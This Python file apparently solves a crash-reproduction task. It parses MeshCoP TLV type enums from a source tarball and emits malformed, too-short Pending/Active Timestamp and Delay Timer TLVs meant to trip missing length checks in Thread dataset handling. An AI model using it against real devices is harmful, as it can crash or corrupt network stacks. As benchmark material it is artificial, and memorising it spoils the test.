import tarfile
import re
import ast

class Solution:
    def solve(self, src_path: str) -> bytes:
        mapping = self._extract_tlv_types_from_tar(src_path)
        # Prefer PendingTimestamp + DelayTimer (both require min-length validation)
        tlvs = []
        if mapping:
            pending_ts = self._find_key(mapping, ['kPendingTimestamp', 'kPendingTimestampTlv', 'kPendingTimestampValue'])
            delay_timer = self._find_key(mapping, ['kDelayTimer', 'kDelayTimerTlv', 'kDelayTlv'])
            active_ts = self._find_key(mapping, ['kActiveTimestamp', 'kActiveTimestampTlv', 'kActiveTimestampValue'])
            if pending_ts is not None and delay_timer is not None:
                # Build a minimal Pending Dataset with too-short TLVs
                tlvs.append(self._make_tlv(pending_ts, b'\x00'))  # length 1 instead of 8
                tlvs.append(self._make_tlv(delay_timer, b'\x00'))  # length 1 instead of 4
                # Also add Active Timestamp short to increase trigger surface
                if active_ts is not None:
                    tlvs.append(self._make_tlv(active_ts, b'\x00'))
                return b''.join(tlvs)
            # Fallback to ActiveTimestamp + DelayTimer short
            if active_ts is not None and delay_timer is not None:
                tlvs.append(self._make_tlv(active_ts, b'\x00'))
                tlvs.append(self._make_tlv(delay_timer, b'\x00'))
                return b''.join(tlvs)
            # If only one is found, just place it (some harnesses may still read it)
            any_key = pending_ts if pending_ts is not None else (active_ts if active_ts is not None else delay_timer)
            if any_key is not None:
                tlvs.append(self._make_tlv(any_key, b'\x00'))
                return b''.join(tlvs)
        # Last-resort fallback: try a range of type values with short lengths, focusing on low range (<128)
        # Use first 64 types (0..63) with len=1 to stay concise yet likely to include the required TLVs.
        data = bytearray()
        for t in range(0, 64):
            data += self._make_tlv(t, b'\x00')
        return bytes(data)

    def _make_tlv(self, tlv_type: int, value: bytes) -> bytes:
        # Ensure type within 0..255
        tlv_type &= 0xFF
        # Avoid extended TLV type (bit 7 set) which changes length encoding; clear it if set
        if tlv_type & 0x80:
            tlv_type &= 0x7F
        length = len(value) & 0xFF
        return bytes([tlv_type, length]) + value

    def _find_key(self, mapping, names):
        for n in names:
            if n in mapping:
                return mapping[n]
        # Try fuzzy search as a fallback
        for target in names:
            for k in mapping:
                if target.lower().replace('k','') in k.lower().replace('k',''):
                    return mapping[k]
        return None

    def _extract_tlv_types_from_tar(self, tar_path):
        try:
            with tarfile.open(tar_path, mode='r:*') as tar:
                texts = []
                for m in tar.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    # Only scan plausible headers/sources to speed up and increase accuracy
                    if not any(s in name_lower for s in ('meshcop', 'dataset', 'tlv', 'tlvs', 'include', 'src', 'core', '.hpp', '.h', '.cpp', '.cc', '.cxx')):
                        continue
                    try:
                        f = tar.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        # Decode as text if possible
                        try:
                            text = data.decode('utf-8', errors='ignore')
                        except Exception:
                            continue
                        texts.append(text)
                    except Exception:
                        continue
                # Try to parse mapping from any text that has the needed tokens
                for text in texts:
                    mapping = self._extract_tlv_types_from_text(text)
                    if mapping and any(k in mapping for k in ('kDelayTimer', 'kPendingTimestamp', 'kActiveTimestamp')):
                        return mapping
                # If not found, try merging all texts and parse once
                if texts:
                    merged = '\n'.join(texts)
                    mapping = self._extract_tlv_types_from_text(merged)
                    if mapping and any(k in mapping for k in ('kDelayTimer', 'kPendingTimestamp', 'kActiveTimestamp')):
                        return mapping
        except Exception:
            pass
        return None

    def _strip_comments(self, s: str) -> str:
        # Remove // and /* */ comments
        s = re.sub(r'//.*', '', s)
        s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
        return s

    def _safe_eval_int(self, expr: str, names: dict) -> int:
        expr = expr.strip()
        try:
            return int(expr, 0)
        except Exception:
            pass
        try:
            node = ast.parse(expr, mode='eval')
        except Exception:
            return None

        def _eval(n):
            if isinstance(n, ast.Expression):
                return _eval(n.body)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, int):
                    return n.value
                if isinstance(n.value, str):
                    try:
                        return int(n.value, 0)
                    except Exception:
                        return None
                return None
            if isinstance(n, ast.Num):  # Py<3.8
                return n.n
            if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
                val = _eval(n.operand)
                if val is None:
                    return None
                if isinstance(n.op, ast.UAdd):
                    return +val
                if isinstance(n.op, ast.USub):
                    return -val
                if isinstance(n.op, ast.Invert):
                    return ~val
            if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.Add, ast.Sub, ast.BitOr, ast.BitAnd, ast.BitXor, ast.LShift, ast.RShift)):
                left = _eval(n.left)
                right = _eval(n.right)
                if left is None or right is None:
                    return None
                if isinstance(n.op, ast.Add):
                    return left + right
                if isinstance(n.op, ast.Sub):
                    return left - right
                if isinstance(n.op, ast.BitOr):
                    return left | right
                if isinstance(n.op, ast.BitAnd):
                    return left & right
                if isinstance(n.op, ast.BitXor):
                    return left ^ right
                if isinstance(n.op, ast.LShift):
                    return left << right
                if isinstance(n.op, ast.RShift):
                    return left >> right
            if isinstance(n, ast.Name):
                return names.get(n.id)
            return None

        return _eval(node)

    def _extract_enum_blocks(self, text: str):
        # returns list of (block_text) for enums
        # Simple heuristic: find 'enum' then capture until the matching '}' (first level)
        # We'll fallback to regex per-block if braces mismatch.
        blocks = []
        for m in re.finditer(r'enum\b', text):
            start = m.start()
            brace_open = text.find('{', start)
            if brace_open == -1:
                continue
            # Scan to find the matching '}' at same level
            depth = 0
            i = brace_open
            while i < len(text):
                if text[i] == '{':
                    depth += 1
                elif text[i] == '}':
                    depth -= 1
                    if depth == 0:
                        blocks.append(text[brace_open+1:i])
                        break
                i += 1
        # Fallback: regex based
        if not blocks:
            for m in re.finditer(r'enum[^{]*\{([^}]*)\}', text, flags=re.S):
                blocks.append(m.group(1))
        return blocks

    def _extract_tlv_types_from_text(self, text: str):
        if not text:
            return None
        text_nc = self._strip_comments(text)
        blocks = self._extract_enum_blocks(text_nc)
        # Try to find the enum defining MeshCoP TLV types (contains our keys)
        mapping = {}
        found = False
        candidates = []
        for block in blocks:
            if any(k in block for k in ('kDelayTimer', 'kPendingTimestamp', 'kActiveTimestamp')):
                candidates.append(block)
        if not candidates:
            return None
        # Prefer the shortest qualifying block to reduce noise
        candidates.sort(key=len)
        for block in candidates:
            enum_map = self._parse_enum_block(block)
            if enum_map:
                mapping.update(enum_map)
                found = True
                # Continue to merge other blocks if present
        return mapping if found else None

    def _parse_enum_block(self, block: str):
        # Parse comma-separated enumerators
        # Keep a running value
        mapping = {}
        cur = -1
        # Split by commas but keep potential commas in initializers by simple split; acceptable since C++ enumerators usually simple
        parts = block.split(',')
        # Track previously resolved names to support references
        names = {}
        for raw in parts:
            token = raw.strip()
            if not token:
                continue
            # Remove possible trailing section after enumerator (e.g., comments removed already)
            # Token may contain braces or line breaks; keep simple
            # Match "name = value" or just "name"
            m = re.match(r'^([A-Za-z_]\w*)(?:\s*=\s*(.+))?$', token)
            if not m:
                continue
            name = m.group(1)
            val_expr = m.group(2)
            if val_expr is not None:
                val_expr = val_expr.strip()
                # Remove possible trailing commas or braces accidentally included
                val_expr = val_expr.strip(',} ')
                val = self._safe_eval_int(val_expr, names)
                if val is None:
                    # Skip if unresolvable
                    continue
                cur = int(val)
            else:
                cur += 1
            # Store
            mapping[name] = cur
            names[name] = cur
        return mapping
